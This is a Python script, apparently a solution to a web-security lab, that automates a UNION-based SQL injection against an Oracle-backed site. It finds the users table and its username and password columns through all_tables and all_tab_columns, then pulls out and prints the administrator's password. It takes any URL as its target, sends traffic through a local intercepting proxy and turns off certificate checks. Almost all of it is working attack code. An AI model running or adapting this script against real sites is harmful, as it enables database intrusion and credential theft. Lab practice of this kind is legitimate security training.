from cgitb import text
import sys
import urllib3
import requests
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}

# Get admin's password
def exploit(url, user_table, user_col, passwd_col):
    payload = f"' UNION SELECT {user_col}, {passwd_col} FROM {user_table}--"
    r = requests.get(url + payload, proxies=proxies, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    password = soup.body.find(text="administrator").parent.find_next('td').contents[0]
    if password:
        return password
    return False

# Get cols from user table
def get_table(url):
    payload = "' UNION SELECT table_name, NULL FROM all_tables--"
    r = requests.get(url + payload, proxies=proxies, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    user_table = soup.body.find(text=re.compile("^USERS\_.*"))
    if user_table:
        return user_table
    return False

# Get user table
def get_columns(url, user_table):
    payload = f"' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='{user_table}'--"
    r = requests.get(url + payload, proxies=proxies, verify=False)
    soup = BeautifulSoup(r.text, 'html.parser')
    try:
        user_col = soup.body.find(text=re.compile('.*USERNAME.*'))
        passwd_col = soup.body.find(text=re.compile('.*PASSWORD.*'))
    except:
        return False
    return user_col,passwd_col

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[.] Usage: %s <url>' % sys.argv[0])
        print('[.] Usage: %s www.google.com' % sys.argv[0])
    print('[.] Getting user table')
    user_table = get_table(url)
    if user_table:
        print(f'[.] Found User table: {user_table}')
        print('[.] Getting columns..')
        creds = get_columns(url, user_table)
        if creds:
            print(f'[.] Found {creds[0]} ,{creds[1]}')
            password = exploit(url, user_table, creds[0], creds[1])
            if password:
                print('[.] Found administrator..')
                print('[.] Getting password..')
                print(f'Password found : {password}')
        else:
            print('[*]username and password col not found')
    else:
        print('[*] User table not found.')